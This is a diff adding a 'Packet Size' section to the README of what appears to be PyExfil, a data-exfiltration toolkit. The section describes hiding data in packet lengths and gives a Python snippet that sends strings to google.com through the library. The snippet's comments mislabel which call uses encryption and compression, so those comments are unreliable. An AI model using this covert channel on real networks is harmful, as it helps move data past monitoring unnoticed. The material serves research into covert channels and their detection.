@@ -481,6 +481,35 @@ Send(
 )
 ```
 
+#### Packet Size
+This one can almost only be used for communication rather than data exfiltration. The idea is to take data, convert it into bytes and then encode these bytes as length in a packet. For example, the string `EXFL` will be converted into `["EX", "FL"]` which will be `[[69, 88],[70, 76]]` which will end up being two packets:
+
+```python
+69*"0" + "\x00" + 88 * "1" + "\x00"
+```
+
+```python
+70*"0" + "\x00" + 76 * "1" + "\x00"
+```
+
+Which is why, as said before, we highly recommend using this method over HTTPS (as implemented here) and using it to relay key codes (i.e., `EX` will mean `exfiltrate` in both sides).
+
+```python
+#!/usr/bin/env python3
+
+from pyexfil.Comm.packet_size import Send
+
+# Send with encryption & compression (WHY?!)
+a = Send(dest_ip="google.com", key=None, port=443, compress=False)
+check, output = a.send_string("hello") # this will also send the packets
+print(a.Decode(output))
+
+# Send without encryption or compression
+a = Send(dest_ip="google.com", key="HeyDonn", port=443, compress=True)
+check, output = a.send_string("hello")
+print(a.Decode(output))
+```
+
 ### Physical
 
 #### Audio
